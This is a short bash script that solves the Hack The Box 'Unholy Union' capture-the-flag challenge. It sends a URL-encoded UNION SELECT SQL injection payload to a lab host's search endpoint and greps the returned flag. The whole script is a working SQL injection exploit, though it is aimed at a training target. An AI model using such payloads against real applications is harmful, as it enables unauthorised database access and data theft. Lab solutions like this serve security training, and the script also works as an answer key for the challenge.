#!/bin/bash
# https://app.hackthebox.com/challenges/Unholy%2520Union
# Tags: SQL injection

TARGET=83.136.253.184:55358
FLAG=$(curl -s "http://$TARGET/search?query=empty'%20UNION%20SELECT%201,flag,3,4,5%20FROM%20flag;%20--%20" | grep -oP 'HTB\{.*?\}')

echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"